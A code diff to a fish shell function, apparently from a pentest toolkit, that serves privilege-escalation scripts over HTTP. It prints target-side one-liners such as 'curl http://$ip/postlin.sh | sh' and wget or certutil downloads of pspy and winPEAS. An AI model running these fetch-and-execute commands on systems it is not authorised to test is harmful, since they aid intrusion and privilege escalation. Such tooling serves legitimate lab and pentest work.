@@ -21,13 +21,23 @@ function pwncat --description "fetch privesc tools and serve them over HTTP"
             curl -sSL $urls[$i] -o $dir/$names[$i]
         end
     end
+    # postlin.sh ships with rasbora (install.sh copies it next to the functions).
+    # Copy it into the served dir so it goes out like the downloaded tools.
+    for cand in (dirname (status filename))/postlin.sh ~/.rasbora/postlin.sh
+        if test -f $cand
+            cp $cand $dir/postlin.sh
+            break
+        end
+    end
+
     chmod +x $dir/* 2>/dev/null
 
     set -l ip (ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
     test -z "$ip"; and set ip (ip -4 addr show scope global | grep -oP 'inet \K[\d.]+' | head -1)
 
     echo
-    echo "  linux:   curl http://$ip/linpeas.sh | sh"
+    echo "  linux:   curl http://$ip/postlin.sh | sh        # rasbora: verdict-first, read section 8 first"
+    echo "           curl http://$ip/linpeas.sh | sh         # then this for what postlin misses, read bottom-up"
     echo "           wget http://$ip/pspy64 -O /tmp/p; chmod +x /tmp/p; /tmp/p"
     echo "  windows: certutil -urlcache -f http://$ip/winPEASx64.exe w.exe"
     echo "           iwr http://$ip/winPEASx64.exe -o w.exe"
